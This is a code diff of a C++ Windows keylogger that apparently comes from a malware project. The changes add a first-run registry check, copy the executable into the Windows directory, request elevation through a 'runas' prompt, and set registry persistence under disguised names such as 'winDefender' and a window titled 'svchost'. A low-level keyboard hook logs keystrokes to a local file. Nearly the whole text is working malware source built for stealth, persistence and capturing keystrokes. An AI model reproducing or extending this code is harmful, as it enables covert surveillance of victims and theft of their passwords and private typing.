@@ -3,11 +3,12 @@
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+BOOL isMyFirstRun();
 BOOL IsRunAsAdmin();
 int makeMeAdmin( HWND hWnd );
 long createRegistry( LPCTSTR data );
 
-Logger* logger = new Logger(LOG_FILE);
+Logger* logger;
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)
@@ -20,10 +21,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	const char g_szClassName[] = "michifu";
 	char* destination = (char*)malloc(sizeof(char) * MAX_PATH);
 	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
+	char* logPath = (char*)malloc(sizeof(char) * MAX_PATH);
 
-	strcpy(destination, std::getenv("windir") );
-	strcat(destination, "\\wsysmic.exe");
-	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH );
+	strcpy(logPath, std::getenv("LOCALAPPDATA") );
+	strcat(logPath, LOG_FILE_NAME );
+	logger = new Logger( logPath );
+
+	strcpy(destination, std::getenv("WINDIR"));
+	strcat(destination, KEYLOG_NAME);
+	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH);
 
 	wndcls.cbSize = sizeof(WNDCLASSEX);
 	wndcls.style = CS_HREDRAW | CS_VREDRAW;
@@ -38,16 +44,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	wndcls.lpszMenuName = NULL;
 	wndcls.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
 
-	( !RegisterClassEx(&wndcls) ) ? logger->write("[ register class success ]\n") : logger->write("[ register class fail ]\n");
+	( RegisterClassEx(&wndcls) ) ? logger->write("[ register class SUCCESS ]\n") : logger->write("[ register class FAIL ]\n");
 	hwnd = CreateWindowEx(NULL,	g_szClassName, "svchost", NULL, 0, 0, 0, 0,	NULL, NULL, hInstance, NULL);
 
-	if (!IsRunAsAdmin()) makeMeAdmin(hwnd);
-
-	( !CopyFile(iam, destination, 0) ) ? logger->write("[ copy success ]\n") : logger->write ("[ copy fail ]\n" );
-	(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register success ]\n") : logger->write("[ register fail ]");
-    
+	if (isMyFirstRun()) {
+		logger->write("[ first Run ]\n");
+		if (!IsRunAsAdmin()) makeMeAdmin(hwnd);
+		logger->write("[ installing keylogger ]\n"); 
+		(CopyFile(iam, destination, 0)) ? logger->write("[ copy SUCCESS ]\n") : logger->write("[ copy FAIL ]\n");
+		(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register SUCCESS ]\n") : logger->write("[ register FAIL ]");
+	}
+	else
+		logger->write("[ keylogger already installed ]\n");
+	  
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
-	(hhkLowLevelKybd != NULL) ? logger->write("hhkLowLevelKybd hooked !\n") : logger->write("hhkLowLevelKybd failed !\n");
+	(hhkLowLevelKybd != NULL) ? logger->write("[ hook SUCCESS ]\n") : logger->write("[ hook FAIL ]\n");
 
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
@@ -244,12 +255,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 		logger->write("[ closed ]\n");
 		logger->~Logger();
 		PostQuitMessage(0);
-		return 0;
+		exit (0);
 		break;
 	default:
 		return DefWindowProc(hwnd, iMsg, wParam, lParam);
 	}
 }
+
 
 BOOL IsRunAsAdmin()
 {
@@ -257,7 +269,8 @@ BOOL IsRunAsAdmin()
 	DWORD dwError = ERROR_SUCCESS;
 	PSID pAdministratorsGroup = NULL;
 	// Allocate and initialize a SID of the administrators group.
-	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+
 	if (!AllocateAndInitializeSid(
 									&NtAuthority,
 									2,
@@ -270,7 +283,8 @@ BOOL IsRunAsAdmin()
 		goto Cleanup;
 	}
 	// Determine whether the SID of administrators group is enabled in 
-	// the primary access token of the process.
+	// the primary access token of the process.
+
 	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
 	{
 		dwError = GetLastError();
@@ -284,10 +298,23 @@ Cleanup:
 		FreeSid(pAdministratorsGroup);
 		pAdministratorsGroup = NULL;
 	}
-
 	// Throw the error if something failed in the function.
 	if (ERROR_SUCCESS != dwError) throw dwError;
 	return fIsRunAsAdmin;
+}
+
+BOOL isMyFirstRun() {
+
+	HKEY hKey;
+	long result = RegOpenKeyEx(HKEY_KEYLOGGER,
+								TEXT(HKEY_KEYLOGGER_SUB),
+								0,
+								KEY_READ,
+								&hKey );
+	if (result == ERROR_SUCCESS)
+		return !(RegQueryValueEx(hKey, HKEY_KEYLOGER_VALUE, 0, NULL, NULL, NULL) == ERROR_SUCCESS); // return true if the register already exists
+	else
+		return FALSE;
 }
 
 int makeMeAdmin(HWND hwnd) {
@@ -301,7 +328,8 @@ int makeMeAdmin(HWND hwnd) {
 		sei.lpVerb = "runas";
 		sei.lpFile = iam;
 		sei.hwnd = hwnd;
-		sei.nShow = SW_NORMAL;
+		sei.nShow = SW_NORMAL;
+
 		if (!ShellExecuteEx(&sei))
 		{
 			DWORD dwError = GetLastError();
@@ -326,7 +354,7 @@ long createRegistry(LPCTSTR data) {
 								TEXT ( HKEY_KEYLOGGER_SUB ),
 								0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, &dw);
 
-	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, "winDefender", 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
+	(result == ERROR_SUCCESS) ?	result = RegSetValueEx(hkey, HKEY_KEYLOGER_VALUE, 0, REG_SZ, (LPBYTE)data, strlen(data) + 1) : result = -1L;
 	RegCloseKey(hkey);
 	return result;
 }
